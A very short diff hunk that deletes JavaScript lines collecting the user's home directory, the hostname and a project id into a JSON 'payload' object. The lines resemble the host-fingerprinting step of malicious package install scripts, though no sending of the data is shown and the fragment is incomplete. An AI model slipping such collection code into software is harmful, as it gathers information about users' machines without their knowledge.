@@ -1,7 +1,0 @@
-var path = os.homedir()
-JSON.stringify({
-    payload: hostname,
-    project_id: process.argv[2],
-    path: path
-  })
-_tmp_2.path = path
